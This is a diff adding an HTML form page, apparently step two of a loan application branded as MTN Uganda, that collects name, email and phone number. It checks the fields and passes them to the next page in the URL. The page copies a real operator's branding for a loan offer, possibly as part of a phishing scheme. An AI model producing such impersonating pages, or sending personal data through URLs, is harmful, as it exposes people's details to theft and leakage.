@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Your Details - MTN Uganda Loans</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+
+        body { background: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+
+        .header {
+            background: #fff; padding: 14px 20px;
+            display: flex; align-items: center; gap: 14px;
+            border-bottom: 3px solid #ffcc00;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+        }
+        .back-arrow {
+            font-size: 22px; color: #333; text-decoration: none;
+            line-height: 1; cursor: pointer;
+        }
+        .logo-box { display: flex; align-items: center; gap: 10px; }
+        .logo-icon {
+            width: 40px; height: 40px; background: #ffcc00;
+            border-radius: 8px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 10px; color: #004f9f;
+            line-height: 1; text-align: center; border: 2px solid #004f9f;
+        }
+        .logo-text { font-weight: 800; font-size: 20px; color: #004f9f; letter-spacing: -0.5px; }
+        .header-title { font-size: 14px; font-weight: 700; color: #444; margin-left: auto; }
+
+        .main { flex: 1; display: flex; justify-content: center; padding: 30px 16px 60px; }
+        .card {
+            background: #fff; width: 100%; max-width: 520px;
+            border-radius: 16px; padding: 36px 30px 32px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            height: fit-content;
+        }
+        .card h1 {
+            font-size: 24px; font-weight: 800; color: #111;
+            text-align: center; margin-bottom: 6px;
+        }
+        .step-text { text-align: center; color: #888; font-size: 13px; margin-bottom: 16px; }
+
+        .progress { display: flex; gap: 8px; justify-content: center; margin-bottom: 30px; }
+        .progress .bar { height: 5px; width: 70px; border-radius: 3px; background: #e0e0e0; }
+        .progress .bar.active { background: #ffcc00; }
+
+        .form-group { margin-bottom: 20px; }
+        .form-group label {
+            display: block; font-size: 14px; font-weight: 700;
+            color: #333; margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%; padding: 14px 16px; font-size: 15px;
+            font-family: inherit; color: #111;
+            border: 1.5px solid #ddd; border-radius: 10px;
+            background: #fff; outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-group input:focus {
+            border-color: #ffcc00;
+            box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+        }
+        .form-group input::placeholder { color: #aaa; }
+
+        .form-row { display: flex; gap: 14px; }
+        .form-row .form-group { flex: 1; }
+
+        /* PHONE INPUT */
+        .phone-row { display: flex; gap: 10px; align-items: stretch; }
+        .country-code {
+            display: flex; align-items: center; justify-content: center;
+            padding: 14px 18px; font-size: 15px; font-weight: 700; color: #333;
+            border: 1.5px solid #ddd; border-radius: 10px;
+            background: #fafafa; white-space: nowrap;
+        }
+        .phone-row input { flex: 1; }
+        .helper-text { font-size: 12px; color: #999; margin-top: 8px; }
+
+        /* BUTTONS */
+        .btn-group { display: flex; gap: 14px; margin-top: 32px; }
+        .prev-btn, .next-btn {
+            flex: 1; padding: 16px; font-size: 15px; font-weight: 800;
+            letter-spacing: 1px; border-radius: 10px; cursor: pointer;
+            text-transform: uppercase; text-align: center;
+            text-decoration: none; display: inline-block;
+            transition: background 0.2s;
+            border: none;
+        }
+        .prev-btn { background: #f0f0f0; color: #333; }
+        .prev-btn:hover { background: #e0e0e0; }
+        .next-btn { background: #ffcc00; color: #111; }
+        .next-btn:hover { background: #e6b800; }
+
+        .error-msg {
+            display: none; text-align: center; color: #dc2626;
+            font-size: 13px; font-weight: 700; margin-top: 12px;
+        }
+        .error-msg.show { display: block; }
+
+        .footer {
+            background: #111; color: #ffcc00; text-align: center;
+            padding: 18px; font-size: 13px; font-weight: 600;
+        }
+
+        @media (max-width: 480px) {
+            .card { padding: 28px 20px; }
+            .card h1 { font-size: 21px; }
+            .progress .bar { width: 55px; }
+            .form-row { flex-direction: column; gap: 0; }
+            .btn-group { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+
+    <header class="header">
+        <a href="offer.html" class="back-arrow">←</a>
+        <div class="logo-box">
+            <div class="logo-icon">MTN<br>UG</div>
+            <div class="logo-text">MTN Uganda</div>
+        </div>
+        <span class="header-title">Mobile Loans</span>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Your Details</h1>
+            <p class="step-text">Step 2 of 3</p>
+
+            <div class="progress">
+                <div class="bar active"></div>
+                <div class="bar active"></div>
+                <div class="bar"></div>
+            </div>
+
+            <form id="detailsForm" onsubmit="return false;">
+                <div class="form-row">
+                    <div class="form-group">
+                        <label for="firstName">First Name</label>
+                        <input type="text" id="firstName" placeholder="Enter first name">
+                    </div>
+                    <div class="form-group">
+                        <label for="lastName">Last Name</label>
+                        <input type="text" id="lastName" placeholder="Enter last name">
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="you@example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="phone">Phone Number</label>
+                    <div class="phone-row">
+                        <span class="country-code">+256</span>
+                        <input type="tel" id="phone" placeholder="7XX XXX XXX" required>
+                    </div>
+                    <p class="helper-text">Enter 9 digits (e.g., 712345678)</p>
+                </div>
+
+                <div class="btn-group">
+                    <a href="offer.html" class="prev-btn" id="prevBtn">Previous</a>
+                    <a href="#" class="next-btn" id="nextBtn">Next Step</a>
+                </div>
+
+                <p class="error-msg" id="errorMsg">Please fill all fields correctly</p>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">© 2026 MTN Uganda Loans</footer>
+
+    <script>
+        const incoming = new URLSearchParams(window.location.search);
+
+        // Previous button keeps data intact
+        document.getElementById('prevBtn').addEventListener('click', function () {
+            this.href = 'offer.html?' + incoming.toString();
+        });
+
+        // Next Step: validate + bundle + go to confirm.html
+        document.getElementById('nextBtn').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const firstName = document.getElementById('firstName').value.trim();
+            const lastName  = document.getElementById('lastName').value.trim();
+            const email     = document.getElementById('email').value.trim();
+            const phone     = document.getElementById('phone').value.replace(/\D/g, '');
+            const errorMsg  = document.getElementById('errorMsg');
+
+            errorMsg.classList.remove('show');
+
+            if (!firstName || !lastName || !email || !phone) {
+                errorMsg.textContent = 'Please fill all fields';
+                errorMsg.classList.add('show');
+                return;
+            }
+            if (!/^[\w.+-]+@[\w-]+\.[\w.-]+$/.test(email)) {
+                errorMsg.textContent = 'Please enter a valid email';
+                errorMsg.classList.add('show');
+                return;
+            }
+            if (phone.length < 9 || phone.length > 10) {
+                errorMsg.textContent = 'Please enter a valid phone (9-10 digits)';
+                errorMsg.classList.add('show');
+                return;
+            }
+
+            const data = new URLSearchParams(incoming);
+            data.set('firstName', firstName);
+            data.set('lastName',  lastName);
+            data.set('email',     email);
+            data.set('phone',     phone);
+
+            window.location.href = 'confirm.html?' + data.toString();
+        });
+    </script>
+</body>
+</html>
